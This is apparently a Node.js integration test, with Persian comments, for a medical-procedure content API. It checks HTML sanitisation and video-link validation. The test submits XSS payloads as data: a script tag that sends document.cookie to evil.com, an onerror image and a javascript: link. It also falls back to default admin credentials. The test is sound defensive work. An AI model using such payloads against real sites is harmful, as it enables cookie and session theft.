/**
 * تست یکپارچهٔ مسیر ذخیرهٔ محتوا:
 * ورود → ذخیرهٔ محتوای HTML → بررسی پاک‌سازی → بررسی ثبت رویداد امنیتی.
 *
 * اجرا: سرور را روی پورت ۳۹۹۷ بالا بیاورید سپس `node scripts/test-content-api.js`
 */
const BASE = process.env.TEST_BASE || 'http://localhost:3997';
const ADMIN_USER = process.env.TEST_USER || 'admin';
const ADMIN_PASS = process.env.TEST_PASS || 'admin123';

let pass = 0, fail = 0;
function check(label, ok, detail) {
    if (ok) { pass++; console.log('  ✓ ' + label); }
    else { fail++; console.log('  ✗ ' + label + (detail ? '\n      → ' + detail : '')); }
}

async function main() {
    console.log('\n── ورود ────────────────────────────────────');
    const loginRes = await fetch(`${BASE}/api/auth/login`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username: ADMIN_USER, password: ADMIN_PASS })
    });
    if (!loginRes.ok) {
        console.error('ورود ناموفق:', loginRes.status, await loginRes.text());
        process.exit(1);
    }
    const { token } = await loginRes.json();
    check('ورود مدیر موفق بود', !!token);

    const authHeaders = {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${token}`
    };

    // یک عمل برای آزمایش برمی‌داریم
    const ops = await (await fetch(`${BASE}/api/operations`)).json();
    const opId = ops[0].id;

    console.log('\n── ذخیرهٔ محتوای سالم ──────────────────────');
    const goodHtml = '<h3>مراحل عمل</h3><p>بیمار در وضعیت <strong>سوپاین</strong> قرار می‌گیرد.</p>'
                   + '<ul><li>اسکالپل شماره ۱۰</li><li>پنس کوخر</li></ul>';
    let res = await fetch(`${BASE}/api/operations/${opId}/content`, {
        method: 'PUT', headers: authHeaders,
        body: JSON.stringify({ description: goodHtml })
    });
    check('ذخیرهٔ محتوای غنی موفق بود', res.ok, String(res.status));

    let saved = await (await fetch(`${BASE}/api/operations/${opId}`)).json();
    check('تگ‌های مجاز حفظ شدند',
          saved.description.includes('<strong>') && saved.description.includes('<li>'),
          saved.description);

    console.log('\n── تلاش تزریق XSS از طریق ویرایشگر ─────────');
    const evilHtml = '<p>متن عادی</p><script>fetch("//evil.com?c="+document.cookie)</script>'
                   + '<img src=x onerror="alert(1)">'
                   + '<a href="javascript:alert(1)">کلیک</a>';
    res = await fetch(`${BASE}/api/operations/${opId}/content`, {
        method: 'PUT', headers: authHeaders,
        body: JSON.stringify({ description: evilHtml })
    });
    check('درخواست پذیرفته شد (ولی باید پاک شده باشد)', res.ok, String(res.status));

    saved = await (await fetch(`${BASE}/api/operations/${opId}`)).json();
    const d = saved.description;
    check('تگ script حذف شد', !/<script/i.test(d), d);
    check('رویداد onerror حذف شد', !/onerror/i.test(d), d);
    check('پروتکل javascript: حذف شد', !/javascript:/i.test(d), d);
    check('متن سالم باقی ماند', d.includes('متن عادی'), d);

    console.log('\n── اعتبارسنجی لینک ویدیو ───────────────────');
    res = await fetch(`${BASE}/api/operations/${opId}/content`, {
        method: 'PUT', headers: authHeaders,
        body: JSON.stringify({ video_url_1: 'https://evil.com/malware' })
    });
    check('لینک ویدیوی غیرمجاز رد شد', res.status === 400, String(res.status));
    const err = await res.json();
    check('پیام خطا فارسی و روشن است',
          typeof err.error === 'string' && /یوتیوب|آپارات/.test(err.error), err.error);

    res = await fetch(`${BASE}/api/operations/${opId}/content`, {
        method: 'PUT', headers: authHeaders,
        body: JSON.stringify({ video_url_1: 'https://www.youtube.com/watch?v=dQw4w9WgXcQ' })
    });
    check('لینک یوتیوب معتبر پذیرفته شد', res.ok, String(res.status));

    console.log('\n── ثبت رویداد امنیتی ───────────────────────');
    // بازگرداندن محتوا به حالت اولیه
    await fetch(`${BASE}/api/operations/${opId}/content`, {
        method: 'PUT', headers: authHeaders,
        body: JSON.stringify({ description: '', video_url_1: '' })
    });
    console.log('  (بررسی جدول security_events در تست دیتابیس انجام می‌شود)');

    console.log(`\n${'═'.repeat(50)}`);
    console.log(`نتیجه: ${pass} قبول · ${fail} رد`);
    process.exitCode = fail > 0 ? 1 : 0;
}

main().catch(err => {
    console.error('تست با خطا متوقف شد:', err.message);
    process.exit(1);
});
